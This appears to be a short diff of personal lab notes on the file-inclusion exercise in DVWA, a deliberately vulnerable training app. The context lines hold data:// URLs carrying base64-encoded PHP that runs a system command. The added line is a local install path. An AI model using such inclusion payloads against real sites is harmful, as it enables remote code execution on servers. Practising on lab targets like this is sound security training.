@@ -16,4 +16,6 @@ http://192.168.0.106/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9w
 http://192.168.0.106/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTsgPz4K
 
 
+C:\xampp\htdocs\dvwa\vulnerabilities\fi
+
 
